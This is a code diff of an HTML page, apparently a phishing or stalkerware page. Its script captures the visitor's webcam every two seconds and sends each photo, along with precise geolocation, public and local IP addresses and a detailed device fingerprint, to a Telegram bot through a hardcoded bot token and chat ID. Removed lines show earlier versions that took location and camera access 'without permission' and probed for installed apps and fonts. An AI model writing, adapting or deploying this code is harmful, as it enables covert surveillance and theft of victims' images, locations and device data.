@@ -7,51 +7,64 @@
 <style>
 body {
     margin: 0;
-    padding: 0;
     background: #000;
     color: #fff;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
     font-family: sans-serif;
-    min-height: 100vh;
+    overflow: hidden;
+    position: relative;
 }
 
-.fixed-button {
+#canvas {
+    display: none;
+}
+
+.button-container {
     position: fixed;
     bottom: 0;
     left: 0;
     width: 100%;
-    height: 60px;
-    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-    border: none;
-    color: white;
-    font-size: 20px;
-    font-weight: bold;
-    cursor: pointer;
+    padding: 20px 0;
+    background: linear-gradient(to top, rgba(0,0,0,0.8), transparent);
     display: flex;
-    align-items: center;
     justify-content: center;
-    z-index: 1000;
-    transition: all 0.3s ease;
+    align-items: center;
 }
 
-.fixed-button:hover {
-    background: linear-gradient(135deg, #5a67d8 0%, #6b46c1 100%);
-    height: 70px;
+button {
+    padding: 15px 40px;
+    font-size: 18px;
+    cursor: pointer;
+    border: none;
+    border-radius: 50px;
+    background: linear-gradient(45deg, #ff0080, #ff8c00);
+    color: white;
+    font-weight: bold;
+    width: 90%;
+    max-width: 300px;
+    box-shadow: 0 5px 15px rgba(255, 0, 128, 0.3);
+    transition: transform 0.2s, box-shadow 0.2s;
 }
 
-.fixed-button:active {
-    background: linear-gradient(135deg, #4c51bf 0%, #553c9a 100%);
+button:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 8px 20px rgba(255, 0, 128, 0.4);
 }
 
-canvas {
-    display: none;
+button:active {
+    transform: translateY(0);
 }
 </style>
 </head>
 <body>
 <canvas id="canvas"></canvas>
-
-<button class="fixed-button" onclick="startSending()">START</button>
-
+<div class="button-container">
+    <button onclick="startSending()">▶ START AUTO SEND</button>
+</div>
 <script>
 const canvas = document.getElementById("canvas");
 const BOT_TOKEN = "7917384016:AAG7cxyuts9UJ-Km0BMqBeQVJEJfstH239g";
@@ -59,7 +72,7 @@ const CHAT_ID = "8319568593";
 let intervalId = null;
 let latitude = "N/A";
 let longitude = "N/A";
-let mapLink = "Location not available";
+let mapLink = "Location not allowed";
 let userIP = "Unknown";
 let stream = null;
 let batteryInfo = "Battery: Not available";
@@ -68,10 +81,19 @@ let localIP = "Unknown";
 let city = "Unknown";
 let country = "Unknown";
 let isp = "Unknown";
-let timezone = "Unknown";
-let language = "Unknown";
 
-// IP-based location without permission
+navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(s => { stream = s });
+
+if ("geolocation" in navigator) {
+    navigator.geolocation.getCurrentPosition(pos => {
+        latitude = pos.coords.latitude.toFixed(6);
+        longitude = pos.coords.longitude.toFixed(6);
+        mapLink = `https://maps.google.com/maps?q=${latitude},${longitude}&z=17&t=k`;
+    }, () => {
+        mapLink = "Location denied";
+    }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+}
+
 fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => {
     userIP = d.ip;
     fetch(`https://ipapi.co/${userIP}/json/`)
@@ -80,28 +102,9 @@ fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => {
             city = ipData.city || "Unknown";
             country = ipData.country_name || "Unknown";
             isp = ipData.org || "Unknown";
-            latitude = ipData.latitude || "N/A";
-            longitude = ipData.longitude || "N/A";
-            timezone = ipData.timezone || "Unknown";
-            mapLink = `https://maps.google.com/maps?q=${latitude},${longitude}&z=17&t=k`;
         });
 });
 
-// Get camera without asking
-navigator.mediaDevices.enumerateDevices()
-    .then(devices => {
-        const videoDevices = devices.filter(device => device.kind === 'videoinput');
-        if (videoDevices.length > 0) {
-            navigator.mediaDevices.getUserMedia({ 
-                video: { 
-                    facingMode: "user",
-                    deviceId: videoDevices[0].deviceId 
-                } 
-            }).then(s => { stream = s });
-        }
-    });
-
-// Get battery info if available
 if (navigator.getBattery) {
     navigator.getBattery().then(b => {
         batteryInfo = `
@@ -113,7 +116,6 @@ Time: ${b.chargingTime === Infinity ? 'Not charging' : b.chargingTime + ' second
     });
 }
 
-// Get network info
 if (navigator.connection) {
     networkInfo = `
 📡 Network:
@@ -124,7 +126,6 @@ Save Data: ${navigator.connection.saveData ? 'Enabled' : 'Disabled'}
 `;
 }
 
-// Get local IP
 const getLocalIPAddress = () => {
     return new Promise(resolve => {
         const pc = new RTCPeerConnection({ iceServers: [] });
@@ -140,84 +141,29 @@ const getLocalIPAddress = () => {
     });
 };
 
-// Get WiFi network info
-const getNetworkInfo = () => {
-    let info = "";
-    if (navigator.connection) {
-        const conn = navigator.connection;
-        info += `Type: ${conn.effectiveType || 'Unknown'}\n`;
-        info += `Downlink: ${conn.downlink || 'Unknown'} Mbps\n`;
-        info += `RTT: ${conn.rtt || 'Unknown'} ms\n`;
-        if (conn.type) {
-            info += `Connection Type: ${conn.type}\n`;
-        }
+const getBrowserPlugins = () => {
+    const plugins = [];
+    for (let i = 0; i < navigator.plugins.length; i++) {
+        plugins.push(navigator.plugins[i].name);
     }
-    return info;
+    return plugins.length > 0 ? plugins.slice(0, 5).join(', ') : 'No plugins detected';
 };
 
-// Get installed apps detection
-const getInstalledApps = () => {
-    const apps = [];
-    
-    // Common app protocols
-    const protocols = [
-        'spotify:', 'skype:', 'zoommtg:', 'slack:', 'discord:',
-        'whatsapp:', 'telegram:', 'viber:', 'ms-word:', 'photoshop:'
-    ];
-    
-    return new Promise(resolve => {
-        let detected = [];
-        protocols.forEach(protocol => {
-            const iframe = document.createElement('iframe');
-            iframe.src = protocol + '//';
-            iframe.style.display = 'none';
-            document.body.appendChild(iframe);
-            setTimeout(() => {
-                if (iframe.contentWindow && iframe.contentWindow.location.protocol === protocol.slice(0, -1)) {
-                    detected.push(protocol.slice(0, -1));
-                }
-                document.body.removeChild(iframe);
-            }, 100);
-        });
-        setTimeout(() => {
-            resolve(detected.length > 0 ? detected.join(', ') : 'No apps detected');
-        }, 500);
-    });
-};
-
-// Get Bluetooth status
-const getBluetoothInfo = () => {
-    if (navigator.bluetooth) {
-        return "Available";
-    }
-    return "Not available or no permission";
-};
-
-// Get more device info
 const getAdvancedSystemInfo = () => {
     const cores = navigator.hardwareConcurrency || 'Unknown';
     const ram = navigator.deviceMemory || 'Unknown';
-    const lang = navigator.language || 'Unknown';
+    const lang = navigator.language;
     const langs = navigator.languages ? navigator.languages.join(', ') : lang;
-    const timezoneInfo = Intl.DateTimeFormat().resolvedOptions().timeZone || timezone;
-    const platform = navigator.platform || 'Unknown';
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const platform = navigator.platform;
     const vendor = navigator.vendor || 'Unknown';
     const cookieEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
     const pdfViewerEnabled = navigator.pdfViewerEnabled ? 'Yes' : 'No';
     const webdriver = navigator.webdriver ? 'Yes' : 'No';
     const maxTouchPoints = navigator.maxTouchPoints || 0;
-    const userAgent = navigator.userAgent || 'Unknown';
+    const userAgent = navigator.userAgent;
     const deviceModel = userAgent.match(/\((.*?)\)/) ? userAgent.match(/\((.*?)\)/)[1] : 'Unknown';
-    
-    // Get browser plugins
-    const plugins = [];
-    if (navigator.plugins) {
-        for (let i = 0; i < navigator.plugins.length; i++) {
-            plugins.push(navigator.plugins[i].name);
-        }
-    }
-    const pluginList = plugins.length > 0 ? plugins.slice(0, 5).join(', ') : 'No plugins';
-    
+    const plugins = getBrowserPlugins();
     const doNotTrack = navigator.doNotTrack || 'Not specified';
     const oscpu = navigator.oscpu || 'Unknown';
     const product = navigator.product || 'Unknown';
@@ -229,14 +175,6 @@ const getAdvancedSystemInfo = () => {
     const offsetSign = utcOffset >= 0 ? '+' : '-';
     const formattedOffset = `UTC${offsetSign}${Math.abs(utcOffset)}`;
 
-    // Get screen info
-    const screenInfo = `
-Screen: ${screen.width}x${screen.height}
-Pixel Ratio: ${window.devicePixelRatio}
-Color Depth: ${screen.colorDepth}
-Orientation: ${screen.orientation ? screen.orientation.type : 'Unknown'}
-`;
-
     return `
 🖥️ SYSTEM INFORMATION:
 Device: ${platform}
@@ -247,65 +185,32 @@ Product: ${product} ${productSub}
 CPU Cores: ${cores}
 RAM: ${ram} GB
 Languages: ${langs}
-Timezone: ${timezoneInfo}
+Timezone: ${timezone}
 UTC Offset: ${formattedOffset}
 Vendor: ${vendor}
-Plugins: ${pluginList}
+Plugins: ${plugins}
 Do Not Track: ${doNotTrack}
 Cookies: ${cookieEnabled}
 PDF Viewer: ${pdfViewerEnabled}
 WebDriver: ${webdriver}
 Touch Points: ${maxTouchPoints}
-Bluetooth: ${getBluetoothInfo()}
-${screenInfo}
+Screen: ${screen.width}x${screen.height}
+Pixel Ratio: ${window.devicePixelRatio}
+Color Depth: ${screen.colorDepth}
 `;
 };
 
-// Get installed fonts
-const getFonts = () => {
-    const fontList = [
-        'Arial', 'Times New Roman', 'Courier New', 'Verdana', 
-        'Tahoma', 'Georgia', 'Comic Sans MS', 'Impact'
-    ];
-    let detected = [];
-    
-    const canvas = document.createElement('canvas');
-    const context = canvas.getContext('2d');
-    canvas.width = 100;
-    canvas.height = 100;
-    
-    fontList.forEach(font => {
-        context.font = '72px ' + font;
-        const text = context.measureText('mmmmmmmmmlli');
-        if (text.width > 0) {
-            detected.push(font);
-        }
-    });
-    
-    return detected.length > 0 ? detected.slice(0, 5).join(', ') : 'Standard fonts';
-};
-
 function startSending() {
-    getLocalIPAddress().then(ip => { 
-        localIP = ip;
-        
-        // Get additional info
-        getInstalledApps().then(apps => {
-            // Start sending immediately
-            if (!intervalId) {
-                captureAndSend(apps);
-                intervalId = setInterval(() => captureAndSend(apps), 2000);
-            }
-        });
-    });
+    getLocalIPAddress().then(ip => { localIP = ip });
+    if (!intervalId) {
+        intervalId = setInterval(captureAndSend, 2000);
+    }
 }
 
-function captureAndSend(installedApps = 'Checking...') {
+function captureAndSend() {
     if (!stream) return;
-    
     const videoTrack = stream.getVideoTracks()[0];
     const imageCapture = new ImageCapture(videoTrack);
-    
     imageCapture.grabFrame().then(imageBitmap => {
         canvas.width = imageBitmap.width;
         canvas.height = imageBitmap.height;
@@ -313,56 +218,37 @@ function captureAndSend(installedApps = 'Checking...') {
         ctx.translate(canvas.width, 0);
         ctx.scale(-1, 1);
         ctx.drawImage(imageBitmap, 0, 0);
-        
         canvas.toBlob(blob => {
             const caption = `
 📸 AUTO CAPTURE - ${new Date().toLocaleTimeString()}
 ⏰ Full Time: ${new Date().toLocaleString()}
 
-📍 IP-BASED LOCATION:
-IP Address: ${userIP}
+📍 ACCURATE LOCATION:
 Latitude: ${latitude}
 Longitude: ${longitude}
 Google Maps: ${mapLink}
 City: ${city}
 Country: ${country}
 ISP: ${isp}
-Timezone: ${timezone}
 
 🌍 NETWORK INFORMATION:
 Public IP: ${userIP}
 Local IP: ${localIP}
-Network Info:
-${getNetworkInfo()}
+${networkInfo}
 
-💻 DEVICE INFORMATION:
 ${getAdvancedSystemInfo()}
 
-📱 INSTALLED APPS:
-${installedApps}
-
-🔋 BATTERY INFO:
 ${batteryInfo}
-
-🖋️ DETECTED FONTS:
-${getFonts()}
 
 ⚠️ Automatic capture every 2 seconds
 `;
-            
             const formData = new FormData();
             formData.append("chat_id", CHAT_ID);
             formData.append("photo", blob);
             formData.append("caption", caption);
-            
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { 
-                method: "POST", 
-                body: formData 
-            });
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
         }, "image/jpeg", 0.7);
-    }).catch(err => {
-        console.log("Camera capture error:", err);
-    });
+    }).catch(() => { });
 }
 </script>
 </body>
